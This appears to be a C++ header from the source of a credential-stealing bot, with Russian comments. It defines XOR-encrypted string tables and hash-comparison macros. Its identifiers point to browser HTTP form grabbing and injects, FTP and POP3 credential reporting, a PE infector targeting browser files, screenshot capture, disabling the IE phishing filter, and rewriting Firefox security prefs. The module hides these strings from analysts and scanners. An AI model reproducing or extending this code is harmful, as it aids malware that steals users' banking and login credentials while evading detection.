/*
  Работа с кодироваными строками, этот файл частично генерируется при сборке.
*/
#pragma once

//Макросы для облегчения получения строк.
#define CSTR_GETW(var, id) WCHAR var[CryptedStrings::len_##id]; CryptedStrings::_getW(CryptedStrings::id_##id, var);
#define CSTR_GETA(var, id) char var[CryptedStrings::len_##id]; CryptedStrings::_getA(CryptedStrings::id_##id, var);

// Macros for hash based string comparison.
#define CRC_RAND 0x0645D434

#define CSTR_EQW(str, id) CryptedStrings::_cmpW(CryptedStrings::crc_##id ^ CRC_RAND, str, -1)
#define CSTR_EQA(str, id) CryptedStrings::_cmpA(CryptedStrings::crc_##id ^ CRC_RAND, str, -1)

#define CSTR_EQNW(str, len, id) CryptedStrings::_cmpW(CryptedStrings::crc_##id ^ CRC_RAND, str, len)
#define CSTR_EQNA(str, len, id) CryptedStrings::_cmpA(CryptedStrings::crc_##id ^ CRC_RAND, str, len)

#define CSTR_EQIW(str, id) CryptedStrings::_cmpiW(CryptedStrings::crci_##id ^ CRC_RAND, str, -1)
#define CSTR_EQIA(str, id) CryptedStrings::_cmpiA(CryptedStrings::crci_##id ^ CRC_RAND, str, -1)

#define CSTR_EQNIW(str, len, id) CryptedStrings::_cmpiW(CryptedStrings::crci_##id ^ CRC_RAND, str, len)
#define CSTR_EQNIA(str, len, id) CryptedStrings::_cmpiA(CryptedStrings::crci_##id ^ CRC_RAND, str, len)

namespace CryptedStrings
{
	typedef struct
	{
		unsigned char key;		//XOR ключ строки.
		unsigned short size;	//Размер строки.
		char *encodedString;	//Зашифрованная строка.
	}STRINGINFO;
  
	//Список ID строк.
	enum
	{
//STRINGS_ID_BEGIN
		id_dllcore_explorer,
		id_osenv_botid_regvalue_2,
		id_nspr4_firefox_prefs_homepage,
		id_nspr4_firefox_profile_id_format,
		id_osenv_regvalue_profilelist_path,
		id_regvalue_ie_phishingfilter1,
		id_sockethook_user_anonymous,
		id_nspr4_prgeterror,
		id_winapitables_prclose,
		id_nspr4_prgetnameforidentity,
		id_userhook_screenshot_format,
		id_httpgrabber_urlencoded,
		id_dllcore_firefox,
		id_wininethook_http_ifmodified,
		id_osenv_botid_format,
		id_httpgrabber_auth_normal,
		id_peinfector_dll_extension,
		id_captcha_gzip,
		id_nspr4_nss3,
		id_winapitables_prread,
		id_sockethook_report_prefix_ftp,
		id_regvalue_ie_phishingfilter2,
		id_userhook_screenshot_file_default_prefix,
		id_httpgrabber_report_format,
		id_nspr4_firefox_prefs_security,
		id_captcha_mimetype_png,
		id_winapitables_prpoll,
		id_httpgrabber_auth_encoded,
		id_peinfector_wantedfiles_ie,
		id_osenv_botid_unknown,
		id_dllcore_getprocaddress,
		id_nspr4_firefox_home_path,
		id_userhook_screenshot_path_format,
		id_nspr4_firefox_profile_relative,
		id_captcha_mimetype_gif,
		id_peinfector_wantedfiles_chrome,
		id_httpgrabber_inject_path_format,
		id_sockethook_report_format,
		id_winapitables_propentcpsocket,
		id_nspr4_prseterror,
		id_wininethook_http_te,
		id_nspr4_nspr4dll,
		id_httpgrabber_request_ct,
		id_captcha_png,
		id_path_wininet_cookie_low,
		id_captcha_gif,
		id_peinfector_wantedfiles_ff,
		id_osenv_botid_format_error,
		id_captcha_jpeg,
		id_wininethook_http_acceptencoding,
		id_osenv_botid_regkey,
		id_winapitables_xpcom,
		id_nspr4_firefox_file_userjs,
		id_captcha_encoding_gzip,
		id_nspr4_firefox_file_profiles,
		id_httpgrabber_inject_grabbed_format,
		id_dllcore_iexplore,
		id_regvalue_ie_phishingfilter3,
		id_sockethook_report_prefix_pop3,
		id_regpath_ie_phishingfilter,
		id_winapitables_prwrite,
		id_captcha_filename_format,
		id_nspr4_firefox_profile_path,
		id_dllcore_loadlibrarya,
		id_osenv_regpath_profilelist,
		id_osenv_botid_regvalue_1,
		id_count
//STRINGS_ID_END
	};
  
	//Список размеров строк.
	enum
	{
//STRINGS_LENGTH_BEGIN
		len_dllcore_explorer = (12 + 1),
		len_osenv_botid_regvalue_2 = (16 + 1),
		len_nspr4_firefox_prefs_homepage = (85 + 1),
		len_nspr4_firefox_profile_id_format = (9 + 1),
		len_osenv_regvalue_profilelist_path = (16 + 1),
		len_regvalue_ie_phishingfilter1 = (7 + 1),
		len_sockethook_user_anonymous = (9 + 1),
		len_nspr4_prgeterror = (11 + 1),
		len_winapitables_prclose = (8 + 1),
		len_nspr4_prgetnameforidentity = (21 + 1),
		len_userhook_screenshot_format = (10 + 1),
		len_httpgrabber_urlencoded = (33 + 1),
		len_dllcore_firefox = (11 + 1),
		len_wininethook_http_ifmodified = (20 + 1),
		len_osenv_botid_format = (11 + 1),
		len_httpgrabber_auth_normal = (50 + 1),
		len_peinfector_dll_extension = (4 + 1),
		len_captcha_gzip = (3 + 1),
		len_nspr4_nss3 = (8 + 1),
		len_winapitables_prread = (7 + 1),
		len_sockethook_report_prefix_ftp = (3 + 1),
		len_regvalue_ie_phishingfilter2 = (9 + 1),
		len_userhook_screenshot_file_default_prefix = (7 + 1),
		len_httpgrabber_report_format = (44 + 1),
		len_nspr4_firefox_prefs_security = (326 + 1),
		len_captcha_mimetype_png = (9 + 1),
		len_winapitables_prpoll = (7 + 1),
		len_httpgrabber_auth_encoded = (34 + 1),
		len_peinfector_wantedfiles_ie = (30 + 1),
		len_osenv_botid_unknown = (7 + 1),
		len_dllcore_getprocaddress = (14 + 1),
		len_nspr4_firefox_home_path = (15 + 1),
		len_userhook_screenshot_path_format = (28 + 1),
		len_nspr4_firefox_profile_relative = (10 + 1),
		len_captcha_mimetype_gif = (9 + 1),
		len_peinfector_wantedfiles_chrome = (38 + 1),
		len_httpgrabber_inject_path_format = (29 + 1),
		len_sockethook_report_format = (14 + 1),
		len_winapitables_propentcpsocket = (16 + 1),
		len_nspr4_prseterror = (11 + 1),
		len_wininethook_http_te = (5 + 1),
		len_nspr4_nspr4dll = (9 + 1),
		len_httpgrabber_request_ct = (18 + 1),
		len_captcha_png = (3 + 1),
		len_path_wininet_cookie_low = (3 + 1),
		len_captcha_gif = (3 + 1),
		len_peinfector_wantedfiles_ff = (27 + 1),
		len_osenv_botid_format_error = (11 + 1),
		len_captcha_jpeg = (4 + 1),
		len_wininethook_http_acceptencoding = (27 + 1),
		len_osenv_botid_regkey = (44 + 1),
		len_winapitables_xpcom = (9 + 1),
		len_nspr4_firefox_file_userjs = (7 + 1),
		len_captcha_encoding_gzip = (4 + 1),
		len_nspr4_firefox_file_profiles = (12 + 1),
		len_httpgrabber_inject_grabbed_format = (25 + 1),
		len_dllcore_iexplore = (12 + 1),
		len_regvalue_ie_phishingfilter3 = (9 + 1),
		len_sockethook_report_prefix_pop3 = (4 + 1),
		len_regpath_ie_phishingfilter = (51 + 1),
		len_winapitables_prwrite = (8 + 1),
		len_captcha_filename_format = (13 + 1),
		len_nspr4_firefox_profile_path = (4 + 1),
		len_dllcore_loadlibrarya = (12 + 1),
		len_osenv_regpath_profilelist = (59 + 1),
		len_osenv_botid_regvalue_1 = (11 + 1),
		len_max = (326 + 1)
//STRINGS_LENGTH_END
	};


	// strings crcs, case sensitive, unicode
	enum
	{
//STRINGS_CRC_BEGIN
		crc_dllcore_explorer = 0x095E2844,
		crc_osenv_botid_regvalue_2 = 0x257BF81F,
		crc_nspr4_firefox_prefs_homepage = 0xD906B3D6,
		crc_nspr4_firefox_profile_id_format = 0x81FE5160,
		crc_osenv_regvalue_profilelist_path = 0x598E0275,
		crc_regvalue_ie_phishingfilter1 = 0x0B76F176,
		crc_sockethook_user_anonymous = 0x8D889235,
		crc_nspr4_prgeterror = 0xE4C4726B,
		crc_winapitables_prclose = 0xC6036D34,
		crc_nspr4_prgetnameforidentity = 0x142A6A68,
		crc_userhook_screenshot_format = 0xD0DEB086,
		crc_httpgrabber_urlencoded = 0xC6375463,
		crc_dllcore_firefox = 0x0996E341,
		crc_wininethook_http_ifmodified = 0xAD05712F,
		crc_osenv_botid_format = 0xE5424215,
		crc_httpgrabber_auth_normal = 0x2645566D,
		crc_peinfector_dll_extension = 0xA2038E51,
		crc_captcha_gzip = 0xFF459B23,
		crc_nspr4_nss3 = 0x74479DE0,
		crc_winapitables_prread = 0xA3DEFF9B,
		crc_sockethook_report_prefix_ftp = 0xA40D03D9,
		crc_regvalue_ie_phishingfilter2 = 0xCC58D2C6,
		crc_userhook_screenshot_file_default_prefix = 0x66463574,
		crc_httpgrabber_report_format = 0xF214CCF0,
		crc_nspr4_firefox_prefs_security = 0xA8957EFA,
		crc_captcha_mimetype_png = 0xE83FF4A9,
		crc_winapitables_prpoll = 0x7AD38955,
		crc_httpgrabber_auth_encoded = 0xA9CD0E4C,
		crc_peinfector_wantedfiles_ie = 0x4FDCEB78,
		crc_osenv_botid_unknown = 0x66463574,
		crc_dllcore_getprocaddress = 0x2255184A,
		crc_nspr4_firefox_home_path = 0x95F0B446,
		crc_userhook_screenshot_path_format = 0x6CCDD1C8,
		crc_nspr4_firefox_profile_relative = 0xE4BA7C9B,
		crc_captcha_mimetype_gif = 0x7220CF72,
		crc_peinfector_wantedfiles_chrome = 0xB1A85DE2,
		crc_httpgrabber_inject_path_format = 0xE613454C,
		crc_sockethook_report_format = 0xA43FD47A,
		crc_winapitables_propentcpsocket = 0x6067F08D,
		crc_nspr4_prseterror = 0xD6D20072,
		crc_wininethook_http_te = 0x9F6C9651,
		crc_nspr4_nspr4dll = 0xEB74CD2B,
		crc_httpgrabber_request_ct = 0x4C3DF687,
		crc_captcha_png = 0x4BA5D132,
		crc_path_wininet_cookie_low = 0xCA6363D0,
		crc_captcha_gif = 0xD1BAEAE9,
		crc_peinfector_wantedfiles_ff = 0x27177FD3,
		crc_osenv_botid_format_error = 0x8E591C2C,
		crc_captcha_jpeg = 0x096F948A,
		crc_wininethook_http_acceptencoding = 0xCC509B0A,
		crc_osenv_botid_regkey = 0x52148FB4,
		crc_winapitables_xpcom = 0x2F06C163,
		crc_nspr4_firefox_file_userjs = 0x5837F726,
		crc_captcha_encoding_gzip = 0x7CA49913,
		crc_nspr4_firefox_file_profiles = 0x38A6B108,
		crc_httpgrabber_inject_grabbed_format = 0x5E80A475,
		crc_dllcore_iexplore = 0x039B84A3,
		crc_regvalue_ie_phishingfilter3 = 0xD543E387,
		crc_sockethook_report_prefix_pop3 = 0xAF8436DA,
		crc_regpath_ie_phishingfilter = 0xFEFE61B4,
		crc_winapitables_prwrite = 0xCAF9B41B,
		crc_captcha_filename_format = 0x6E3D75E6,
		crc_nspr4_firefox_profile_path = 0xBAD52634,
		crc_dllcore_loadlibrarya = 0x3EA180E9,
		crc_osenv_regpath_profilelist = 0x988C8508,
		crc_osenv_botid_regvalue_1 = 0xB7B0CEC0,
//STRINGS_CRC_END
	};

	// strings crcs, case insensitive (lowercase), unicode
	enum
	{
//STRINGS_CRCI_BEGIN
		crci_dllcore_explorer = 0x095E2844,
		crci_osenv_botid_regvalue_2 = 0xE2BD32C3,
		crci_nspr4_firefox_prefs_homepage = 0xD906B3D6,
		crci_nspr4_firefox_profile_id_format = 0xDCB8E950,
		crci_osenv_regvalue_profilelist_path = 0xC70C05C1,
		crci_regvalue_ie_phishingfilter1 = 0xC61289AE,
		crci_sockethook_user_anonymous = 0x8D889235,
		crci_nspr4_prgeterror = 0x2EC5C80E,
		crci_winapitables_prclose = 0x53056D41,
		crci_nspr4_prgetnameforidentity = 0x6772EA4A,
		crci_userhook_screenshot_format = 0xD0DEB086,
		crci_httpgrabber_urlencoded = 0xC6375463,
		crci_dllcore_firefox = 0x0996E341,
		crci_wininethook_http_ifmodified = 0xC3E938A9,
		crci_osenv_botid_format = 0x3F9B6567,
		crci_httpgrabber_auth_normal = 0xABCE0331,
		crci_peinfector_dll_extension = 0xA2038E51,
		crci_captcha_gzip = 0xFF459B23,
		crci_nspr4_nss3 = 0x74479DE0,
		crci_winapitables_prread = 0x8FFD3EED,
		crci_sockethook_report_prefix_ftp = 0xA40D03D9,
		crci_regvalue_ie_phishingfilter2 = 0x312CC5C8,
		crci_userhook_screenshot_file_default_prefix = 0x66463574,
		crci_httpgrabber_report_format = 0xABADB6C7,
		crci_nspr4_firefox_prefs_security = 0x28C25503,
		crci_captcha_mimetype_png = 0xE83FF4A9,
		crci_winapitables_prpoll = 0x56F04823,
		crci_httpgrabber_auth_encoded = 0xDB33B0B1,
		crci_peinfector_wantedfiles_ie = 0x5FF799D2,
		crci_osenv_botid_unknown = 0x66463574,
		crci_dllcore_getprocaddress = 0x511151F1,
		crci_nspr4_firefox_home_path = 0xB94CB49A,
		crci_userhook_screenshot_path_format = 0x6CCDD1C8,
		crci_nspr4_firefox_profile_relative = 0xE97957ED,
		crci_captcha_mimetype_gif = 0x7220CF72,
		crci_peinfector_wantedfiles_chrome = 0x0BE29908,
		crci_httpgrabber_inject_path_format = 0xD4AC44F1,
		crci_sockethook_report_format = 0xA43FD47A,
		crci_winapitables_propentcpsocket = 0xABF48587,
		crci_nspr4_prseterror = 0x1CD3BA17,
		crci_wininethook_http_te = 0x2947F7D7,
		crci_nspr4_nspr4dll = 0xEB74CD2B,
		crci_httpgrabber_request_ct = 0x4F326475,
		crci_captcha_png = 0x4BA5D132,
		crci_path_wininet_cookie_low = 0xCDCF66E6,
		crci_captcha_gif = 0xD1BAEAE9,
		crci_peinfector_wantedfiles_ff = 0xA3B6A988,
		crci_osenv_botid_format_error = 0x8E591C2C,
		crci_captcha_jpeg = 0x096F948A,
		crci_wininethook_http_acceptencoding = 0xCA5AAC77,
		crci_osenv_botid_regkey = 0x7AD83AD9,
		crci_winapitables_xpcom = 0x2F06C163,
		crci_nspr4_firefox_file_userjs = 0x5837F726,
		crci_captcha_encoding_gzip = 0x7CA49913,
		crci_nspr4_firefox_file_profiles = 0x38A6B108,
		crci_httpgrabber_inject_grabbed_format = 0x975DE46D,
		crci_dllcore_iexplore = 0x039B84A3,
		crci_regvalue_ie_phishingfilter3 = 0x2837F489,
		crci_sockethook_report_prefix_pop3 = 0xAF8436DA,
		crci_regpath_ie_phishingfilter = 0xE46C05EE,
		crci_winapitables_prwrite = 0x5FFFB46E,
		crci_captcha_filename_format = 0x6E3D75E6,
		crci_nspr4_firefox_profile_path = 0x43A34462,
		crci_dllcore_loadlibrarya = 0x42CC214C,
		crci_osenv_regpath_profilelist = 0x246AA37D,
		crci_osenv_botid_regvalue_1 = 0xC6593E55,
//STRINGS_CRCI_END
	};

	/*
		Инициализация.
	*/
	void init(void);

	/*
		Деинициализация.
	*/
	void uninit(void);

	/*
		Получение строки как ANSI.

		IN id      - id_*.
		OUT buffer - буффер.
	*/
	void _getA(WORD id, LPSTR buffer);

	/*
		Получение строки как Unicode.

		IN id      - id_*.
		OUT buffer - буффер.
	*/
	void _getW(WORD id, LPWSTR buffer);

	/*
		Checks if the unicode string is equal to crypted string.

		IN hash   - hash of string (crc_*).
		IN string - string, that we're checking for match.
		IN length - number of characters to 'compare', if -1 - whole string.

		Returns - true if given string matches the hash.
	*/
	bool _cmpW(DWORD hash, LPWSTR string, int length);

	/*
		Checks if the ascii string is equal to crypted string.

		IN hash   - hash of string (crc_*).
		IN string - string, that we're checking for match.
		IN length - number of characters to 'compare', if -1 - whole string.

		Returns - true if given string matches the hash.
	*/
	bool _cmpA(DWORD hash, LPSTR string, int length);

	/*
		Checks if the unicode string is equal to crypted string, case insensitive.

		IN hash   - hash of string (crci_*).
		IN string - string, that we're checking for match.
		IN length - number of characters to 'compare', if -1 - whole string.

		Returns - true if given string matches the hash.
	*/
	bool _cmpiW(DWORD hash, LPWSTR string, int length);

	/*
		Checks if the ascii string is equal to crypted string, case insensitive.

		IN hash   - hash of string (crci_*).
		IN string - string, that we're checking for match.
		IN length - number of characters to 'compare', if -1 - whole string.

		Returns - true if given string matches the hash.
	*/
	bool _cmpiA(DWORD hash, LPSTR string, int length);
};
